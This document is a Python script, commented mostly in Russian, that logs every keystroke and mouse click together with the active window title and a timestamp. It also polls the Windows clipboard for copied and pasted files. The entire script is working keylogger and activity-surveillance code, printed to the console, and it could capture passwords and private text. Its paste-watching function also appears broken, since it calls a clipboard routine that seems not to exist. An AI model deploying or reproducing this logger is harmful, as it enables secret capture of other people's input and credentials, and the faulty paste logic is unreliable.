from pynput import keyboard, mouse  # Импорт модулей для перехвата клавиатуры и мыши
import time
import win32clipboard  # Модуль для работы с буфером обмена Windows
import pygetwindow  # Модуль для работы с окнами Windows
from datetime import datetime  # Модуль для работы с датой и временем

# Переменные для хранения последних обнаруженных данных буфера обмена
last_copied_file = None


# Функция для обработки событий нажатия клавиш
def on_press(key):
    try:
        # Получаем текущее активное окно
        current_window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindowTitle())[0]
        # Выводим информацию о нажатой клавише, текущем окне и времени
        print('[{}] Key {} pressed in window "{}"'.format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), key.char,
                                                          current_window.title))
    except AttributeError:
        # Если клавиша специальная (например, Enter, Shift), выводим ее код
        print('[{}] Special key {} pressed'.format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), key))

    # Функция для обработки событий клика мыши


def on_click(x, y, button, pressed):
    if pressed:
        # Получаем текущее активное окно
        current_window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindowTitle())[0]
        # Выводим информацию о клике мыши, текущем окне и времени
        print(
            '[{}] Mouse clicked at ({}, {}) with {} in window "{}"'.format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                                                           x, y, button, current_window.title))

    # Функция для перехвата копирования файла


def watch_clipboard():
    global last_copied_file
    win32clipboard.OpenClipboard()
    try:
        # Получаем данные из буфера обмена
        copied_file = win32clipboard.GetClipboardData(win32clipboard.CF_HDROP)
        # Если файл, отличный от последнего обнаруженного, то выводим информацию о копировании
        if copied_file != last_copied_file:
            # Получаем текущее активное окно
            current_window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindowTitle())[0]
            # Выводим информацию о копировании файла, текущем окне и времени
            print('[{}] File copied: {} from "{}"'.format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), copied_file,
                                                          current_window.title))
            # Обновляем последний скопированный файл
            last_copied_file = copied_file
    except TypeError:
        pass
    finally:
        win32clipboard.CloseClipboard()

    # Функция для перехвата вставки файла


def watch_paste():
    global last_copied_file
    win32clipboard.OpenClipboard()
    try:
        # Check for CF_HDROP format
        pasted_files = win32clipboard.GetClipboardData(win32clipboard.CF_HDROP)
        if pasted_files and pasted_files != last_copied_file:
            # Convert the bytes to a list of file paths
            file_paths = []
            for i in range(win32clipboard.DragQueryFile(pasted_files)):
                file_paths.append(win32clipboard.DragQueryFile(pasted_files, i))
            # Print information about pasted files
            current_window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindowTitle())[0]
            for path in file_paths:
                print('[{}] File pasted: {} to "{}"'.format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), path, current_window.title))
            # Update the last copied file
            last_copied_file = pasted_files
    except TypeError:
        pass
    finally:
        win32clipboard.CloseClipboard()
    # Устанавливаем ловушки для клавиатуры и мыши


keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener = mouse.Listener(on_click=on_click)

# Запускаем слушатели
keyboard_listener.start()
mouse_listener.start()

# Периодически проверяем буфер обмена на копирование и вставку файлов
while True:
    watch_clipboard()
    watch_paste()
    time.sleep(1)